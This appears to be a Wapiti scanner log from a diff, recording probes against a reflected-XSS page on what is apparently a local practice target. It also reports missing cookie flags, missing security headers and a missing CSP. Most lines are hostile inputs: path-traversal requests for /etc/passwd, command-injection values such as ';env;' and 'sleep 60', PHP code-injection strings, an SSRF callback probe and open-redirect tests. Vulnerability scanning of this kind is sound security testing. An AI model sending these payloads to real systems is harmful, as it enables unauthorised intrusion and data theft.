+2024-03-20 12:47:27.093 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:27.102 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 12:47:27.112 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 12:47:27.122 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 12:47:27.130 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 12:47:27.140 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.148 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.158 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:27.166 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:27.175 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.184 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.194 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:27.202 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:27.212 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=file%3A%2F%2F%2Fetc%2Fpasswd (0)
+2024-03-20 12:47:27.221 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 12:47:27.230 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
+2024-03-20 12:47:27.239 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
+2024-03-20 12:47:27.249 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.259 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:27.270 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.279 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:27.295 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
+2024-03-20 12:47:27.301 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
+2024-03-20 12:47:27.326 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 12:47:27.342 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:27.342 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 12:47:27.342 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 12:47:27.382 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 12:47:27.458 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 12:47:27.474 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:27.489 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 12:47:27.490 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 12:47:27.551 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 12:47:27.551 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 12:47:27.655 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-20 12:47:27.671 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:27.671 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/vulnerabilities/xss_r/?name=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2Ffnnpx8%2F1%2F6e616d65%2F (0)
+2024-03-20 12:47:27.692 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
+2024-03-20 12:47:27.698 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
+2024-03-20 12:47:27.714 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=fnnpx8 for results, please wait...
+2024-03-20 12:47:29.796 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-20 12:47:29.813 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:29.813 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/xss_r/?name=https%3A%2F%2Fopenbugbounty.org%2F
+2024-03-20 12:47:29.837 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/vulnerabilities/xss_r/?name=%2F%2Fopenbugbounty.org%2F
+2024-03-20 12:47:29.871 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
+2024-03-20 12:47:29.884 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
+2024-03-20 12:47:29.913 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 12:47:29.924 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:29.926 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3Benv%3B (0)
+2024-03-20 12:47:29.936 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%7Cenv%7C (0)
+2024-03-20 12:47:29.947 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Benv%3B (0)
+2024-03-20 12:47:29.957 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Benv%3B (0)
+2024-03-20 12:47:29.966 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
+2024-03-20 12:47:29.977 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%3Benv%3B (0)
+2024-03-20 12:47:29.988 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%0Aenv%3B (0)
+2024-03-20 12:47:29.999 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%26set%26 (0)
+2024-03-20 12:47:30.014 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=set (0)
+2024-03-20 12:47:30.027 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=env (0)
+2024-03-20 12:47:30.041 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fe%00 (0)
+2024-03-20 12:47:30.053 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 12:47:30.064 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 12:47:30.076 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 12:47:30.088 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 12:47:30.098 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 12:47:30.109 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 12:47:30.119 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 12:47:30.129 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 12:47:30.143 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 12:47:30.156 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 12:47:30.166 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
+2024-03-20 12:47:30.178 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
+2024-03-20 12:47:30.189 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
+2024-03-20 12:47:30.201 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%60%29%60 (0)
+2024-03-20 12:47:30.213 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%60sleep%2060%60 (0)
+2024-03-20 12:47:30.225 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Bsleep%2060%3B (0)
+2024-03-20 12:47:30.236 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%7Csleep%2060%3B (0)
+2024-03-20 12:47:30.247 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%26ping%20-n%2025%20127.0.0.1%26 (0)
+2024-03-20 12:47:30.265 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
+2024-03-20 12:47:30.274 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
+2024-03-20 12:47:30.299 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 12:47:30.311 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:30.321 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 12:47:30.414 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 12:47:30.457 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module permanentxss
+2024-03-20 12:47:30.471 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:30.495 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
+2024-03-20 12:47:30.520 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
+2024-03-20 12:47:30.618 | GREEN    | wapitiCore.controller.wapiti:write_report:601 - [*] Generating report...
+2024-03-20 12:47:30.648 | SUCCESS  | wapitiCore.controller.wapiti:write_report:603 - A report has been generated in the file ./data/output//xss_r_high.json/
+2024-03-20 12:47:30.648 | SUCCESS  | wapitiCore.controller.wapiti:write_report:605 - Open ./data/output//xss_r_high.json/web_03202024_1247.html with a browser to see this report.
